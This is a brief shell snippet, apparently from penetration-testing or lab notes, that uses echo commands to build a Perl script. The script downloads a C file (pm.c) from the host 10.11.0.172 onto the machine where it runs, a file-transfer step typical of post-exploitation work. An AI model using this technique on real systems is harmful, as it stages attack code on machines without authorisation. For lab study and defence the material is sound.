echo '#!/usr/bin/perl' >perl_dl.pl
echo 'use LWP::Simple;'  >>perl_dl.pl
echo '$url = "'http://10.11.0.172/pm.c'";' >>perl_dl.pl
echo '$file = "'download_via_perl'";' >>perl_dl.pl
echo 'getstore($url, $file);' >>perl_dl.pl
